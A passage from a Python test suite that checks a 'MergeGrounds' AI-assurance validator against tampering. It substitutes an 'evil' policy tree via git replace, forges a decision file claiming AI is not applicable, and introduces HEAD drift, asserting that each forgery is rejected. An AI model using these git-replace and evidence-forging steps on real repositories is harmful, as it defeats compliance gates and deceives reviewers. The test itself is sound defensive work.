                stdout=subprocess.PIPE,
            ).stdout.strip()
            evil_root_tree = subprocess.run(
                ["git", "mktree"],
                cwd=repository,
                check=True,
                text=True,
                input=f"040000 tree {evil_mergegrounds_tree}\t.mergegrounds\n",
                stdout=subprocess.PIPE,
            ).stdout.strip()
            subprocess.run(
                ["git", "replace", tree, evil_root_tree],
                cwd=repository,
                check=True,
            )
            replaced_policy = subprocess.run(
                ["git", "show", f"{head}:.mergegrounds/ai-assurance.toml"],
                cwd=repository,
                check=True,
                stdout=subprocess.PIPE,
            ).stdout
            self.assertEqual(evil_policy, replaced_policy)
            replacement_safe = execute(canonical)
            self.assertEqual(0, replacement_safe.returncode, replacement_safe.stderr)
            evil_decision = {
                **decision,
                "product_ai": False,
                "capabilities": [],
                "report_path": None,
                "config_digest": digest(evil_policy),
                "report_digest": None,
                "expected_case_set_digest": None,
                "findings": [{"code": "AI_NOT_APPLICABLE"}],
            }
            replacement_forgery = execute(
                (json.dumps(evil_decision, separators=(",", ":")) + "\n").encode()
            )
            self.assertNotEqual(0, replacement_forgery.returncode)
            subprocess.run(
                ["git", "replace", "-d", tree],
                cwd=repository,
                check=True,
                stdout=subprocess.PIPE,
            )

            decision_path.unlink()
            decision_path.write_bytes(canonical)
            (repository / "head-drift.txt").write_text("drift\n", encoding="utf-8")
            subprocess.run(["git", "add", "head-drift.txt"], cwd=repository, check=True)
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=MergeGrounds QA",
                    "-c",
                    "user.email=mergegrounds-qa@example.invalid",
                    "commit",
                    "-qm",
                    "HEAD drift",
                ],
                cwd=repository,
                check=True,
            )
            wrong_head = subprocess.run(
                [sys.executable, "-I", "-", ".mergegrounds/evidence/ai-decision.json"],
                cwd=repository,
                env={**os.environ, "EXPECTED_SHA": head},
                input=validator,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(0, wrong_head.returncode)


if __name__ == "__main__":
    unittest.main()
